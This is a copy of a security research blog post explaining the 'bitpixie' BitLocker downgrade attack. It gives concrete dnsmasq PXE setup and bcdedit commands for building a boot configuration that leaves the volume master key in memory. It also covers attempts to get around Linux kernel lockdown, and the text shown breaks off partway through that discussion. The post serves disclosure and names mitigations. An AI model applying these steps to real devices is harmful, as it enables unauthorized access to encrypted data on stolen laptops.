<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://neodyme.io/en/blog/bitlocker_screwed_without_a_screwdriver/">Original</a>
    <h1>Windows BitLocker – Screwed Without a Screwdriver</h1>
    
    <div id="readability-page-1" class="page"><div> <h2 id="teaser">Teaser<a aria-hidden="true" tabindex="-1" href="#teaser"><span>¶</span></a></h2>
<p>Someone steals your laptop. It’s running Windows 11, fully up-to-date. Device encryption (Windows BitLocker) is enabled. Secure Boot is active. BIOS/UEFI settings are locked down.
So, you’re safe, right?</p>
<ul>
<li><strong>Question 1</strong>: Can the thief access your files without knowing your password?</li>
<li><strong>Question 2</strong>: Do they even need to disassemble the laptop for the attack?</li>
</ul>
<p><strong>The answer: Yes, they can access your files. And, no, they don’t need to disassemble the laptop. The device can stay closed, no screwdriver is required.</strong>
Thanks to a bug discovered by Rairii in August 2022, attackers can extract your disk encryption key on Windows’ default “Device Encryption” setup.
This exploit, dubbed <a href="https://github.com/Wack0/bitlocker-attacks?tab=readme-ov-file#bitpixie">bitpixie</a>, relies on downgrading the Windows Boot Manager.
All an attacker needs is the ability to plug in a LAN cable and keyboard to decrypt the disk.</p>
<p>When I first learned about this, my reaction was <strong>WHY ISN’T THIS FIXED IN 2025, AND HOW DID I NOT KNOW ABOUT THIS UNTIL NOW?</strong>
Hardware attacks?
Sure, I was familiar with those.
But a pure software exploit this simple?
Surely it couldn’t be real!</p>
<p>In this post, I’ll guide you through my deep dive into the bitpixie vulnerability.
First, I’ll share what motivated this research, then unpack the technical details of the attack, and finally outline potential mitigations.
The broader question of why Microsoft hasn’t fully addressed this issue demands its own post. In a dedicated article — <a href="https://neodyme.io/en/blog/bitlocker_why_no_fix">On Secure Boot, TPMs, SBAT and Downgrades — Why Microsoft hasn’t fixed BitLocker yet</a> — I demystify the Secure Boot ecosystem and explain the challenges at play.</p>
<p>For the blue teamers among you, there is a section on <a href="#affected-devices">affected devices</a> and <a href="#mitigation">mitigations</a> further down below, if you want to skip ahead. Short answer: use a <a href="https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/countermeasures">pre-boot PIN</a>, or apply <a href="https://support.microsoft.com/en-us/topic/kb5025885-how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d#bkmk_mitigation_guidelines">KB5025885</a>.</p>

<div>
						<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentColor" d="M13 9h-2V7h2m0 10h-2v-6h2m-1-9A10 10 0 0 0 2 12a10 10 0 0 0 10 10a10 10 0 0 0 10-10A10 10 0 0 0 12 2Z"></path></svg><p>
						 Note that there aren’t any tools for exploiting this bug that are widely available yet. While this post describes everything you need to know, we are not publishing a ready-made tool.
					</p></div>
				
<h2 id="motivation">Motivation<a aria-hidden="true" tabindex="-1" href="#motivation"><span>¶</span></a></h2>
<p>I’ve always wondered how folks gain access to encrypted devices without knowing the password.
Sure, they likely have some bugs, but what kinds of bugs?
Do they need government backdoors or 0-days?
My assumption was:
If I have a fully up-to-date system, surely I am pretty secure.</p>
<p>Then, in January 2024, the 6th edition of the <strong>Realworld CTF</strong> came along with a very intriguing challenge: <a href="https://github.com/chaitin/Real-World-CTF-6th-Challenges/tree/main/Grandma&#39;s%20Laptop">“Grandma’s Laptop”</a>.
We were given remote access to a BitLocker-encrypted Windows system running in QEMU.
Hence, no hardware attacks were possible.
The CTF ended without any solves, even though many of the world’s top teams were competing.</p>
<p>The challenge author was even kind as to drop a hint: <a href="https://github.com/Wack0/bitlocker-attacks">https://github.com/Wack0/bitlocker-attacks</a>.
In the following months, I spent some time off and on digging into this a lot more.
This blog is the result of my research.
May it be helpful for you, dear reader!</p>
<h2 id="bitlocker-how-does-it-even-work">BitLocker. How does it even work?<a aria-hidden="true" tabindex="-1" href="#bitlocker-how-does-it-even-work"><span>¶</span></a></h2>
<p>Before discussing the exploit in detail, let’s review some BitLocker basics.
Many researchers have extensively written about BitLocker, so I’ll only recap the important and relevant facts here.
Let’s first have a look at the <a href="https://support.microsoft.com/en-us/windows/bitlocker-overview-44c0c61c-989d-4a69-8822-b95cd49b1bbf">Microsoft documentation</a>:</p>
<blockquote>
<p>BitLocker is a Windows security feature that protects your data by encrypting your drives. This encryption ensures that if someone tries to access a disk offline, they won’t be able to read any of its content.</p>
<p>BitLocker is particularly valuable if your device is lost or stolen, as it keeps your sensitive information secure. It’s designed to be user-friendly and integrates seamlessly with the Windows operating system, making it easy to set up and manage.</p>
<p>BitLocker offers two functionalities:</p>
<ul>
<li><strong>Device Encryption</strong>, which is designed for simplicity of use, and it’s usually enabled automatically</li>
<li><strong>BitLocker Drive Encryption</strong>, which is designed for advanced scenarios, and it allows you to manually encrypt drives</li>
</ul>
</blockquote>
<p>To summarize, BitLocker is a disk encryption, where ease of use is important.
There are two “modes” of operation: <strong>Device Encryption</strong> and <strong>BitLocker Drive Encryption</strong>.
The former is an automatically enabled, simple-to-use default configuration of BitLocker.
This is the only form of encryption available on Windows Home, while the full BitLocker features require Pro/Enterprise editions.</p>
<p>Ease of use is not only important for home users, though; It has the same relevance in corporate environments!
As such, the configuration we see most often in the wild is precisely that of Device Encryption.
To achieve this ease of use, Device Encryption is configured to automatically unlock the disk without the user even noticing.
I call this <strong>unattended unlock</strong>.
The hard drive is encrypted at rest but is automatically unsealed when a legit Windows boots, which means that users don’t need a separate disk decryption password:
They just have to sign in with their usual user account.
The Windows bootloader and <strong>Secure Boot</strong> are supposed to protect the disk encryption.
Unfortunately, this configuration has been broken for quite a while.</p>
<p>Let us now look at the high-level key derivation for BitLocked root partitions:</p>
<div><figure><img src="https://cceckman.com/blog/bitlocker_screwed_without_a_screwdriver/Bitlocker%20Flow.excalidraw.svg"/><figcaption>Image 1: BitLocker Keys, simplified</figcaption></figure></div>
<p>Very simplified, the <strong>Disk</strong> stores four distinct pieces of data:</p>
<ul>
<li>the <em>unencrypted</em> bootloader (something needs to do the decryption, after all), and</li>
<li>three pieces of <em>encrypted</em> data:
<ul>
<li>the <strong>Volume Master Key (VMK)</strong>,</li>
<li>the <strong>Full Volume Encryption Key (FVEK)</strong>, and</li>
<li>the <strong>Encrypted Data</strong>, which contains the Windows kernel, drivers, software, and all user data.</li>
</ul>
</li>
</ul>
<p>Encrypted data is read in three steps:</p>
<ol>
<li>The bootloader uses some TPM black magic (which we’ll examine later) to decrypt the Volume Master Key (VMK) stored on the disk.</li>
<li>With the now decrypted VMK, the FVEK can be decrypted.</li>
<li>Finally, that FVEK is used to decrypt all data. It is kept in memory, and whenever a block of data needs to be read/written, it is used. Most software doesn’t even know that the disk is encrypted, as the kernel transparently handles all the de/encryption of blocks and files.</li>
</ol>
<h3 id="vmk-decryption">VMK Decryption<a aria-hidden="true" tabindex="-1" href="#vmk-decryption"><span>¶</span></a></h3>
<p>VMK decryption is a bit involved. The VMK has so-called “Protectors” and each, on its own, can be used to derive the same VMK.
Almost always, multiple protectors are present. Let’s look at a few relevant ones:</p>
<p>The easiest way to do VMK decryption is to let the user enter a password.
This is supported (though it’s not the default) and is called pre-boot authentication.
Something similar is used for recovery:
There is usually at least one recovery password that is automatically generated and saved in the user’s Microsoft account or printed during the BitLocker setup.
Such a recovery secret usually looks like <code>049687-028908-468886-502117-436326-177529-711007-400917</code>.</p>
<p>But recall that the intention of BitLocker is to be user-friendly!
Letting the user enter a password before even the Windows kernel is available seems like quite some hassle.
One more password that could be forgotten.
This is where a magic black box called the “Trusted Platform Module” (TPM) comes into play.
With its help, a nice feature called <strong>Secure Boot</strong> is implemented, which can attest that a valid Windows is booting.
If, and only if, a bootloader with a valid Microsoft signature boots, the TPM gives access to the VMK.
If anything goes wrong during this unlocking, the bootloader prompts the user to use the dreaded BitLocker recovery screen.
Since this TPM and Secure Boot-based unlock is usually invisible to the user, it is a nice default.
I like to call this <strong>unattended unlock</strong>, since it unlocks the disk without any user interaction, as long as the bootloader is legit.</p>
<p>To see all protectors on your specific BitLocker partition, run <code>manage-bde -protectors -get c:</code> from a Windows console:</p>
<pre tabindex="0"><code><span><span>PS C:\Users\win-t&gt; manage-bde -protectors -get c:</span></span>
<span><span>BitLocker Drive Encryption: Configuration Tool version 10.0.26100</span></span>
<span><span>Copyright (C) 2013 Microsoft Corporation. All rights reserved.</span></span>
<span><span></span></span>
<span><span>Volume C: []</span></span>
<span><span>All Key Protectors</span></span>
<span><span></span></span>
<span><span> Numerical Password:</span></span>
<span><span> ID: {C2932722-6C21-48A9-8A43-B33DBD329DAE}</span></span>
<span><span> Password:</span></span>
<span><span> 049687-028908-468886-502117-436326-177529-711007-400917</span></span>
<span><span> Backup type:</span></span>
<span><span> Microsoft account backup</span></span>
<span><span></span></span>
<span><span> TPM:</span></span>
<span><span> ID: {85825FF8-3733-48D0-B0EE-4D32D8AAFD7A}</span></span>
<span><span> PCR Validation Profile:</span></span>
<span><span> 7, 11</span></span>
<span><span> (Uses Secure Boot for integrity validation)</span></span></code></pre>
<p>Above, you see the default output on a freshly set up Windows 11 24H2.
It has two protectors:
The first is a recovery key backed up to the Microsoft account and the second is a TPM protector with the default PCR 7,11 Secure Boot Validation.
What this means precisely, we’ll see later.</p>
<p>The decrypted VMK is really all we need to decrypt the drive!
So, let’s investigate how that works on a normal Windows boot a bit more closely.</p>
<h2 id="unattended-unlock-boot-flow">Unattended Unlock Boot Flow<a aria-hidden="true" tabindex="-1" href="#unattended-unlock-boot-flow"><span>¶</span></a></h2>
<div><figure><img src="https://cceckman.com/blog/bitlocker_screwed_without_a_screwdriver/bootloader%20recovery%20flow.excalidraw.svg"/><figcaption>Image 2: Windows Boot Flow</figcaption></figure></div>
<p>The Windows bootloader is reasonably complicated and has lots of different options.
Here, we only show the parts relevant for this exploit.
Let us first look at the <em>happy case</em> of a typical Windows boot:</p>
<p><strong>Happy case!</strong>
There are three components: platform/UEFI booting, the Windows boot manager <code>bootmgfw.efi</code>, and the full Windows environment.</p>
<ol>
<li><strong>Platform boot (UEFI)</strong> initializes the system and:
<ol>
<li>The UEFI firmware checks the digital signature of the Windows bootloader (<code>bootmgfw.efi</code>) using Secure Boot magic.</li>
<li>Once verified, the UEFI chainloads the bootloader from the unencrypted portion of the disk.</li>
</ol>
</li>
<li><strong>Bootloader</strong> (<code>bootmgfw.efi</code>) determines which disk to boot from, decrypts it, then boots into the Windows OS.
<ol>
<li>Reads the Boot Configuration Data (BCD).</li>
<li>Identifies the target disk and reads its metadata. If it’s BitLocker-encrypted, the metadata includes the encrypted Volume Master Key (VMK).</li>
<li>Requests the TPM to decrypt the VMK, using PCR-based validation (e.g., PCR 7,11 by default).</li>
<li>Uses the decrypted VMK to unlock the Full Volume Encryption Key (FVEK), which decrypts the rest of the disk.</li>
<li>Decrypts the Windows kernel and related data on the disk, then boots into the operating system.</li>
</ol>
</li>
<li><strong>Windows login</strong> prompts the user for their credentials to complete the boot process and access the system.</li>
</ol>
<p>At every step in this flow, many things could go wrong.</p>
<p><strong>Error case!</strong>
If the bootloader encounters an issue (e.g., corrupted files or invalid configuration), it attempts to boot into a recovery environment.
This is done by returning to the BCD, looking up the relevant recovery entry, and attempting to boot it.
The recovery image could be <em>anything</em>:
It might be another valid Windows, which could unseal the disk, or it might not.
Hence, all secrets (e.g., VMK, FVEK) in memory must be wiped before transitioning to recovery!
If secrets remain in memory, the recovery environment could inadvertently leak them or be exploited by an attacker. <em>— foreshadowing intensifies</em></p>
<p>With all that understanding under your belt, let’s finally look at the bug:</p>
<h2 id="bitpixie-how-does-the-exploit-work">Bitpixie: How Does the Exploit Work?<a aria-hidden="true" tabindex="-1" href="#bitpixie-how-does-the-exploit-work"><span>¶</span></a></h2>
<p>In one of the bootloader’s many flows, disk encryption keys are not deleted when fallback booting. — Oops. —
This bug, known as <a href="https://github.com/Wack0/bitlocker-attacks?tab=readme-ov-file#bitpixie">bitpixie</a> (CVE-2023-21563), was discovered in August 2022 by Rairii, but had actually existed in the Windows bootloader since October 2005. It was fixed late 2022, and publically disclosed in February 2023.
Due to some unfortunate design in the Secure Boot standard, it is <strong>still exploitable today!</strong></p>
<p>The issue arises during a specific flow known as the “PXE Soft Reboot”.
When a boot fails, this is supposed to load a recovery image via the network, without fully restarting the system.
Unfortunately, the bootloader <strong>forgot to wipe the VMK</strong> — the critical piece of data that unlocks the BitLocker-encrypted disk — before attempting this.
As a result, the VMK remains potentially accessible to any code loaded during or after the PXE boot.</p>
<div><figure><img src="https://cceckman.com/blog/bitlocker_screwed_without_a_screwdriver/bootloader%20exploit%20flow.excalidraw.svg"/><figcaption>Image 3: Windows Boot Exploit Flow</figcaption></figure></div>
<p><strong>Why isn’t this fixed</strong> you might ask?
Great question!
Of course, it <strong>is</strong> fixed in new bootloaders!
But the situation isn’t so simple.
Recall that the TPM gives us the VMK if <em>any</em> legit Windows boots?
There is (by default) no additional verification.
This means we can simply <em>downgrade</em> our bootmanager, to one that still has the vulnerability.
And it isn’t at all difficult to find an old one.</p>
<p>The bug itself is not all that interesting.
Forgetting to clear the key when you do something else is a pretty common issue.
But the exploit is interesting, and the investigation into why this is still exploitable is even more so!</p>
<p><strong>Exploit steps</strong></p>
<ol>
<li>PXE Boot into downgraded, vulnerable bootloader.</li>
<li>Serve a “correct-enough” boot configuration.
<ul>
<li>Correct enough to unseal the BitLocker-encypted partition with the TPM.</li>
<li>Broken enough to trigger the recovery flow into a PXE soft reboot.</li>
</ul>
</li>
<li>Boot into Linux and scan the physical memory for the VMK.</li>
<li>Use the VMK to mount the BitLocker partition with read/write access.</li>
</ol>
<h3 id="step-1-pxe-boot-into-a-downgraded-dootloader">Step 1: PXE Boot Into a Downgraded Dootloader<a aria-hidden="true" tabindex="-1" href="#step-1-pxe-boot-into-a-downgraded-dootloader"><span>¶</span></a></h3>
<p>If you’ve ever used PXE, you might know that is kind of a pain to set up.
At least I struggled in the past getting it to work in my home network.
Thankfully, our scenario is a bit simpler.
Here, we only need two devices: the attacker device and the victim device.
No full network is required!
Instead, we’ll set up a point-to-point link by connecting the two devices with a LAN cable.</p>
<p>With that, we can leverage <code>dnsmasq</code>, a fantastic tool that bundles everything we need for this operation:</p>
<pre tabindex="0"><code><span><span>sudo</span><span> dnsmasq</span><span> --no-daemon</span><span> \</span></span>
<span><span>    --interface=</span><span>&#34;</span><span>$INTERFACE</span><span>&#34;</span><span> \</span></span>
<span><span>    --dhcp-range=10.13.37.100,10.13.37.101,255.255.255.0,1h</span><span> \</span></span>
<span><span>    --dhcp-boot=bootmgfw.efi</span><span> \</span></span>
<span><span>    --enable-tftp</span><span> \</span></span>
<span><span>    --tftp-root=</span><span>&#34;</span><span>$ABS_TFTP_ROOT</span><span>&#34;</span><span> \</span></span>
<span><span>    --log-dhcp</span></span></code></pre>
<p>Here’s what’s happening:
On the attacker device, we start <code>dnsmasq</code> on the network interface that is connected to the victim.
We choose an arbitrary DHCP range, and set the <code>dhcp-boot</code> option to the filename of our downgraded bootloader.
We enable a TFTP to deliver all necessary files, including the vulnerable bootloader, and enable logging.</p>
<p>But wait, you say!
<strong>Where do we get this ominous “downgraded bootmanager” from?</strong>
Any way you want, really.
The key is that it must predate November 2022 (build 25236) when PXEboot vulnerabilities were patched.
This can, for example, be old Windows ISOs.
You could also try your luck on <a href="https://winbindex.m417z.com/?file=bootmgfw.efi">Winbindex</a>, though many (all?) of the old bootmanagers are not available anymore.</p>
<p>Before proceeding, I ensured my PXE boot setup is functional.
To build confidence, I booted into various operating systems with Secure Boot disabled.
You could also reboot into a copy of the original Windows boot manager with secure boot enabled, which should allow you to boot the normal Windows installation from the disk.</p>
<h3 id="step-2-unlock-bitlocker-by-serving-a-correct-enough-boot-configuration">Step 2: Unlock Bitlocker by Serving a Correct-Enough Boot Configuration<a aria-hidden="true" tabindex="-1" href="#step-2-unlock-bitlocker-by-serving-a-correct-enough-boot-configuration"><span>¶</span></a></h3>
<p>In addition to the <code>bootmgfw.efi</code> file, several supporting files are required.
When we copy the boot manager from a legitimate EFI partition, we can just grab all files from there.
Otherwise, we can look at the TFTP log in <code>dnsmasq</code> to see what files the boot manager requests.
Most of the files are non-essential assets like fonts and UI elements.
If these are missing, the boot manager will still function, albeit with a less polished, text-only UI.
The essential part we do have to worry about is a config file: the Boot Configuration Data (BCD), located at <code>$TFTP/Boot/BCD</code>.
The BCD file is analogous to a <code>grub.cfg</code> file in Linux.
It describes all available boot options and fallbacks, specifying details like the partition and kernel to boot from, as well as associated parameters.</p>
<p>Official documentation on BCD is kind of sparse, though some resources have reversed most of the structure.
The file is a Windows registry hive and can, in theory, be edited by any registry editing tool.
In practice, though, there are lots of magic values in them, so I didn’t find this particulary helpful.
Instead, I recommend using Microsoft’s official <code>bcdedit.exe</code> tool, which is preinstalled on all Windows machines.</p>
<p>There are a bunch of hidden arguments to bcdedit that help a bit:
Use <code>bcdedit /store testbcd /enum all</code> or <code>bcdedit /store testbcd /enum all /raw</code> to print the raw values contained in a BCD file.
Without the raw argument there is some pretty printing applied, that for example hides the partition GUID and simply replaces it with the corresponding drive letter, e.g. <code>C:</code>.
If you don’t know that, you get reaaally confused why your BCD isn’t working right :p.</p>
<p>Some helpful resources for learning more:</p>
<ul>
<li>The official Docs on <code>bcdedit</code> can be found here: <a href="https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/bcdedit-command-line-options?view=windows-11">BCDEdit Command-Line Options</a>.</li>
<li>More expansive Docs from 2017 are available in a docx here: <a href="https://learn.microsoft.com/en-us/previous-versions/windows/hardware/design/dn653986(v=vs.85)">BCDEdit Commands for Boot Environment</a></li>
<li>Another resource that I found quite helpful is documentation from <a href="https://www.mistyprojects.co.uk/documents/BCDEdit/files/device.htm">mistyprojects.co.uk / BCDEdit</a></li>
<li>And a list of most available elements and their raw values from <a href="https://geoffchappellmirror.github.io/notes/windows/boot/bcd/elements.htm">Geoff Chappell / BCD Elements</a></li>
<li>Finally, there is this Russian site on bootmgr errors that can sometimes help if the boot doesn’t go as you expect and it shows an inscrutable error: <a href="http://datadump.ru/bootmgr-errors/">Bootmgr Errors</a></li>
</ul>
<p>Okay, so now we know how to edit a BCD file.
But what do we put in there?
This was the trickiest part of this exploit chain, as you get very little feedback when things go wrong.
Recall the bug we are trying to reproduce: We want the bootloader to attempt to boot from our BitLocker partition, fail, and then trigger a PXE soft reboot into our controlled OS.</p>
<p>The easiest way to get this working has three parts:</p>
<ol>
<li>Get the <em>original</em> BCD from the victim’s device.
This ensures the configuration matches the specific partition GUIDs.
You can do that by shift-rebooting Windows, going “Troubleshoot &gt; Advanced options &gt; Command Prompt”, mounting the boot partition, and copying its contents to a USB drive.
Or, be more advanced and use an SMB mount, if you don’t have USB access.</li>
</ol>
<pre tabindex="0"><code><span><span>mountvol s: </span><span>/</span><span>s</span></span>
<span><span>Copy-Item</span><span> S:</span><span>/</span><span>EFI D:</span><span>/</span><span>efi</span><span>-</span><span>copy </span><span>-</span><span>Recurse</span></span></code></pre>
<ol start="2">
<li>Using <code>bcdedit</code>, create a new boot entry for the PXE soft reboot.
The element list on <a href="https://geoffchappellmirror.github.io/notes/windows/boot/bcd/elements.htm">Geoff Chappell / BCD Elements</a> is helpful here:</li>
</ol>
<pre tabindex="0"><code><span><span>bcdedit /store BCD_modded /create /d &#34;softreboot&#34; /application startup</span></span></code></pre>
<p>We specify a custom store, so we operate on that file, not the system store.
We create a new startup application and give it an arbitrary name, here “softreboot”.
Then, we need to set this up to use <code>pxesoftreboot</code>:</p>
<pre tabindex="0"><code><span><span>bcdedit /store BCD_modded /set {%REBOOT_GUID%} path &#34;\shimx64.efi&#34;</span></span>
<span><span>bcdedit /store BCD_modded /set {%REBOOT_GUID%} device boot</span></span>
<span><span>bcdedit /store BCD_modded /set {%REBOOT_GUID%} pxesoftreboot yes</span></span></code></pre>
<p>Note that we set the path to <code>shimx64.efi</code>.
This is the bootloader that will be loaded when this boot entry is selected!
More on that later.</p>
<ol start="3">
<li>Add this new boot option as recovery to our default boot entry, and modify the default boot entry to always trigger recovery.
We do this by setting the path to <code>\</code>.
By pointing to a valid path but an invalid kernel, the bootloader will fail but still unlock the BitLocker partition, leaving the Volume Master Key (VMK) in memory.
Any other syntactically valid path that doesn’t point to a bootable kernel would work as well:</li>
</ol>
<pre tabindex="0"><code><span><span>bcdedit /store BCD_modded /set {default} recoveryenabled yes</span></span>
<span><span>bcdedit /store BCD_modded /set {default} recoverysequence {%REBOOT_GUID%}</span></span>
<span><span>bcdedit /store BCD_modded /set {default} path &#34;\\&#34;</span></span>
<span><span>bcdedit /store BCD_modded /set {default} winpe yes</span></span></code></pre>
<p>We <em>cannot</em> create a universal BCD that works for all targets.
This is because in the BCD we just copied, there is a <code>DEVICE</code> property that specifies the partition GUID to boot from.
This GUID varies between systems, so the BCD must be tailored to the target.
When this GUID is wrong, the bootmanager won’t attempt any disk unseals, and the VMK won’t be left in memory.
While you could edit the GUID, which is also available from the target device command prompt or disk metadata, it’s often easier to copy the original BCD and modify it.</p>
<p>The complete BCD edit procedure, executed from the recovery command prompt, looks like this:</p>
<pre tabindex="0"><code><span><span>d:</span></span>
<span><span>bcdedit </span><span>/</span><span>export BCD_modded</span></span>
<span><span>bcdedit </span><span>/</span><span>store BCD_modded </span><span>/</span><span>create </span><span>/</span><span>d </span><span>&#34;softreboot&#34;</span><span> /</span><span>application startup</span><span>&gt;</span><span>GUID.txt</span></span>
<span><span>For</span><span> /</span><span>F </span><span>&#34;tokens=2 delims={}&#34;</span><span> %%</span><span>i </span><span>in</span><span> (GUID.txt) </span><span>do</span><span> (set REBOOT_GUID</span><span>=%%</span><span>i)</span></span>
<span><span>del guid.txt</span></span>
<span><span>bcdedit </span><span>/</span><span>store BCD_modded </span><span>/</span><span>set {</span><span>%</span><span>REBOOT_GUID</span><span>%</span><span>} path </span><span>&#34;\shimx64.efi&#34;</span></span>
<span><span>bcdedit </span><span>/</span><span>store BCD_modded </span><span>/</span><span>set {</span><span>%</span><span>REBOOT_GUID</span><span>%</span><span>} device boot</span></span>
<span><span>bcdedit </span><span>/</span><span>store BCD_modded </span><span>/</span><span>set {</span><span>%</span><span>REBOOT_GUID</span><span>%</span><span>} pxesoftreboot yes</span></span>
<span></span>
<span><span>bcdedit </span><span>/</span><span>store BCD_modded </span><span>/</span><span>set {</span><span>default</span><span>} recoveryenabled yes</span></span>
<span><span>bcdedit </span><span>/</span><span>store BCD_modded </span><span>/</span><span>set {</span><span>default</span><span>} recoverysequence {</span><span>%</span><span>REBOOT_GUID</span><span>%</span><span>}</span></span>
<span><span>bcdedit </span><span>/</span><span>store BCD_modded </span><span>/</span><span>set {</span><span>default</span><span>} path </span><span>&#34;\\&#34;</span></span>
<span><span>bcdedit </span><span>/</span><span>store BCD_modded </span><span>/</span><span>set {</span><span>default</span><span>} winpe yes</span></span>
<span></span>
<span><span>bcdedit </span><span>/</span><span>store BCD_modded </span><span>/</span><span>displayorder {</span><span>%</span><span>REBOOT_GUID</span><span>%</span><span>} </span><span>/</span><span>addlast</span></span>
<span><span>copy d:\BCD_modded p:\BCD</span></span></code></pre>
<div><figure><img src="https://cceckman.com/blog/bitlocker_screwed_without_a_screwdriver/bcdedit.png"/><figcaption>Image 4: Example of a modified BCD (simplified)</figcaption></figure></div>
<h3 id="step-3-boot-into-os-scan-memory-for-vmk">Step 3: Boot Into OS, Scan Memory for VMK<a aria-hidden="true" tabindex="-1" href="#step-3-boot-into-os-scan-memory-for-vmk"><span>¶</span></a></h3>
<p>Booting into the downgraded bootmanager and modified BCD is straightforward: Just use the shift-reboot trick in Windows again.
Navigate to “Use a device &gt; PXE Boot”.
This action will boot into the downgraded bootmanager, load the BCD, unseal the disk, fail to launch the kernel, and execute the <code>pxesoftreboot</code>.</p>
<p>I was testing this exploit in QEMU, and once I got this far, immediately dumped memory, scanned for the VMK, and found it!
Happy with the result, I got ready to wrap up this exploit. I thought reading the memory for the VMK would be straightforward — just boot into my controlled OS, and scan the memory.
But I quickly realized another challenge lay ahead: Secure Boot — again.</p>
<p>Since the system we are operating on still has Secure Boot enabled, the Windows bootloader checks the signature for the next stage we are doing a fallback boot into.
We don’t necessarily have to network boot into Windows, but the payload must have a valid secure boot signature.</p>
<p><strong>The first attempt:</strong> Just use Linux! Major Linux distributions have Secure Boot, right?</p>
<p>It seemed promising: Modern distros use a signed “shim” (a pre-boot loader) approved by Microsoft’s third-party Secure Boot certificate.
Recall that we specified <code>shimx64.efi</code> as path in the <code>pxesoftreboot</code> recovery entry? That’s where this came from.
Secure Boot implementations on Linux involve multiple layers:</p>
<ul>
<li>Shim: Signed by Microsoft, it includes a distro-specific key (though the codebase is the same) to boot a distro-signed grub.</li>
<li>Grub: Signed with the distro’s key, loads only distro-signed kernels.</li>
</ul>
<p>This means we need matching shim+grub+kernel from a distro that has everthing nicely signed.
I picked a random netboot image with Secure Boot support, PXEBoot it, and <strong>dumped the memory</strong>:</p>
<pre tabindex="0"><code><span><span>❯</span><span> cat</span><span> /dev/mem</span></span>
<span><span>cat:</span><span> /dev/mem:</span><span> Permission</span><span> denied</span></span>
<span><span>❯</span><span> sudo</span><span> cat</span><span> /dev/mem</span></span>
<span><span>cat:</span><span> /dev/mem:</span><span> Operation</span><span> not</span><span> permitted</span></span>
<span><span>❯</span><span> sudo</span><span> dmesg</span><span> |</span><span> tail</span><span> -n</span><span> 1</span></span>
<span><span>[</span><span>328854.672148</span><span>] Lockdown: cat: /dev/mem,kmem,port is restricted; </span><span>see</span><span> man</span><span> kernel_lockdown.7</span></span></code></pre>
<p>Ahh, great!
Our kernel is in <strong>lockdown mode</strong> :)
This is a feature of the Linux kernel to protect itself from root.
In lockdown mode, any kernel modifications, including loading unsigned modules, are blocked, even if an attacker has full root privileges. This includes any raw memory read or write access.
Once enabled, lockdown cannot be disabled on a running system.</p>
<h3 id="step-3a-finding-a-way-around-lockdown-mode">Step 3a: Finding a Way Around Lockdown Mode<a aria-hidden="true" tabindex="-1" href="#step-3a-finding-a-way-around-lockdown-mode"><span>¶</span></a></h3>
<p>I figured we might not even need a Linux kernel since grub also offers some built-in memory reading/writing functionality!
But, as it turns out, grub helpfully also disables those when Secure Booted, via the shim-lock ‘protocol’, see <a href="https://wiki.archlinux.org/title/GRUB#Shim-lock">ArchWiki/GRUB#Shim-Lock</a> or <a href="https://www.gnu.org/software/grub/manual/grub/html_node/UEFI-secure-boot-and-shim.html">grub Manual</a>.</p>
<blockquote>
<p>Additionally, the commands that can be used to subvert the UEFI Secure Boot mechanism, like iorw and memrw, are disabled in Secure Booted environments via the GRUB Lockdown mechanism.</p>
</blockquote>
<p>Okay, that’s a non-starter.
Maybe we can find a signed shim that is “weird”, and let’s us boot into something that doesn’t have raw-memory read restrictions?
We can look for distros that have shim available on <a href="https://pkgs.org/search/?q=shim">pkgs.org/shim</a> or <a href="https://pkgs.org/search/?q=shim-signed">pkgs.org/shim-signed</a>.
The coordination process for signing shims is also public at <a href="https://github.com/rhboot/shim-review/issues">GitHub: shim-review</a>.
Unfortunately, many bootloaders were recently revoked due to severe security issues, and won’t boot anymore when secure boot is enabled.  I needed something reasonably recent.
I ultimately found no viable workaround here, and just stuck to a shim from one of the major distros.</p>
<p>Okay, so we are back to bypassing lockdown on a Linux kernel.
Distros really go out of their way to include custom lockdown patches downstream.
Looking at upstream code doesn’t help; you have to go to the source of your actual distro.</p>
<p>For example, here are all the custom patches Debian had in 2016 for protecting lockdown mode: <a href="https://salsa.debian.org/kernel-team/linux/-/tree/afceeb64fe527dfec9ad203746192f3a3a30636a/debian/patches/features/all/lockdown">Debian GitLab: debian/patches/features/all/lockdown</a>.
Yes, there really were 33 custom patches, just for lockdown.
These days, there are a lot fewer but the main kernel-lockdown-on-Secure-Boot patch is still there: <a href="https://salsa.debian.org/kernel-team/linux/-/blob/debian/latest/debian/patches/features/all/lockdown/efi-lock-down-the-kernel-if-booted-in-secure-boot-mo.patch">efi-lock-down-the-kernel-if-booted-in-secure-boot-mo.patch</a>, as upstream refuses to merge that.
The reason behind the distros patches is simple, as seen in <a href="https://www.webpronews.com/opensuse-begins-enforcing-secure-boot-kernel-lockdown/">openSUSE Begins Enforcing Secure Boot Kernel Lockdown</a>:</p>
<blockquote>
<p>[…] according to a Reddit thread that also links to an openSUSE mailing list, Microsoft evidently refused to continue signing openSUSE’s bootload shim unless Kernel Lockdown was enabled. As a result, beginning with kernel 6.2.1, openSUSE Tumbleweed will enable Kernel Lockdown whenever Secure Boot is also enabled.</p>
</blockquote>
<p><em>Funny side note: <a href="https://man7.org/linux/man-pages/man7/kernel_lockdown.7.html">Kernel docs on lockdown</a> are <em>wrong</em> here: They mention lockdown is automatically enabled when Secure Boot is on. However, this is only true for downstream kernels. They simply <a href="https://bbs.archlinux.org/viewtopic.php?id=284085">copied fedoras man page</a></em>.</p>
<p>In the past, we had exploits like <a href="https://git.zx2c4.com/american-unsigned-language">american-unsigned-language</a> to get around lockdown.
However, I could not find a kernel on which such an exploit worked and from which I could boot.</p>
<p>Another avenue I briefly persued was to enroll a Machine-Owner-Key (MOK). This is a feature provided by most Linux shims that let users sign their own kernels with their own keys.
To configure the MOK, I would have to boot into a <code>MoKManager</code> bootloader that would enroll the key. From my brief experiments, I could not get this to work from PXE.
Since this solution felt inelegant, leaving traces on the device, I abandoned it.</p>
<p><strong>To summarize:</strong> All Linux distros that are bootable with Microsoft-signed Secure Boot also enable lockdown mode on boot.
